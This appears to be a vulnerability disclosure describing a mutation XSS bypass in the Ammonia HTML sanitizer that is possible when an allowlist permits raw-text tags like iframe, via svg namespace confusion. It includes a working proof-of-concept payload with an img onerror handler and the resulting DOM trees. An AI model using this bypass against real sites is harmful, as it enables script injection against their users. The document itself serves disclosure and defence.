The issue happens if developers added to the list of allowed tags any
tag which is parsed in RCDATA state, PLAINTEXT state or RCDATA state,
that is:

* title
* textarea
* xmp
* iframe
* noembed
* noframes
* plaintext
* noscript
* style
* script

An example in the wild is Plume, that allows iframe.  So in next
examples I'll assume the following policy:

    Builder::new()
       .add_tags(&["iframe"])

In HTML namespace `<iframe>` is parsed specially; that is, its content is
treated as text. For instance, the following html:

    <iframe><a>test

Is parsed into the following DOM tree:

    iframe
    └─ #text: <a>test

So iframe cannot have any children other than a text node.

The same is not true, though, in "foreign content"; that is, within
`<svg>` or `<math>` tags. The following html:

    <svg><iframe><a>test

is parsed differently:

    svg
    └─ iframe
       └─ a
          └─ #text: test

So in SVG namespace iframe can have children.

Ammonia disallows <svg> but it keeps its content after deleting it. And
the parser internally keeps track of the namespace of the element. So
assume we have the following snippet:

    <svg><iframe><a title="</iframe><img src onerror=alert(1)>">test

It is parsed into:

    svg
    └─ iframe
       └─ a title="</iframe><img src onerror=alert(1)>"
          └─ #text: test

This DOM tree is harmless from ammonia point of view because the piece
of code that looks like XSS is in a title attribute. Hence, the
resulting "safe" HTML from ammonia would be:

    <iframe><a title="</iframe><img src onerror=alert(1)>" rel="noopener noreferrer">test</a></iframe>

However, at this point, the information about namespace is lost, which
means that the browser will parse this snippet into:

    ├─ iframe
    │  └─ #text: <a title="
    ├─ img src="" onerror="alert(1)"
    └─ #text: " rel="noopener noreferrer">test

Leading to XSS.

